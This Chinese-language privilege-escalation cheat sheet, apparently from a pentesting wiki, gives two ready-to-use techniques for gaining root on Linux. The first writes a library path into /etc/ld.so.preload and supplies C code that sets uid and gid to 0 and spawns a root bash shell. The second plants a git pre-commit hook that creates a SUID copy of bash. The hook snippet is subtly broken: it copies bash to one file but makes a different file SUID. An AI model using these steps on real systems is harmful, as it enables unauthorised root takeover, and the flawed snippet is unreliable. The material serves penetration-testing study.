/etc/ld.so.preload

此文件的行为类似于 LD_PRELOAD 环境变量，但它也适用于 SUID 二进制文件。
如果您可以创建或修改它，您可以添加一个 将在每个执行的二进制文件中加载的库的路径。

例如：echo "/tmp/pe.so" > /etc/ld.so.preload

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}

Git hooks

Git hooks 是 在 git 仓库中 发生各种 事件 时 运行的脚本，例如当创建提交、合并时... 所以如果一个 特权脚本或用户 经常执行这些操作，并且可以 在 .git 文件夹中写入，这可以用于 privesc。

例如，可以在 git 仓库的 .git/hooks 中 生成一个脚本，以便在创建新提交时始终执行：

{% code overflow="wrap" %}

echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit

{% endcode %}
